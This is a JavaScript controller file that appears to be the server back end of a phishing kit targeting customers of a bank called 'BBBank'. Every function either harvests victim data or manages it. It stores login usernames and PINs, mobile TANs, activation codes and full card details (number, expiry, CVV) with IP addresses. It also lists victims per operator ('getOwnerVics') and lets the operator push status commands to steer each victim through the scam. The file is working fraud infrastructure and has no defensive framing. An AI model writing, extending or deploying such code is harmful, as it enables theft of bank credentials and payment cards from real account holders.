const BBBank = require("../models/bbbankController");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	BBBank.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await BBBank.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	BBBank.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { username, pin, uniqueid, owner, ip } = req.body;
	try {
		let user = await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ username, pin, status: 1 }
		);
		if (!user.length) {
			await BBBank.create({
				uniqueid,
				username,
				pin,
				status: 1,
				owner,
				ip,
				timestamp: moment().format(),
			});
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, pin, uniqueid } = req.body;
	try {
		await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ username, pin, status: 10, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitMobileTan = async (req, res) => {
	const { mobileTan, uniqueid } = req.body;
	try {
		await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ mobileTan, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitActivation = async (req, res) => {
	const { activationCode, uniqueid, owner, ip } = req.body;
	try {
		let user = await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ activationCode, status: 5, timestamp: moment().format() }
		).exec();
		if (!user.length) {
			await BBBank.create({ uniqueid, activationCode, owner, ip, status: 5 });
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cvv, status: 7, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await BBBank.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitMobileTan,
	submitCard,
	submitActivation,
	deleteEntry,
};
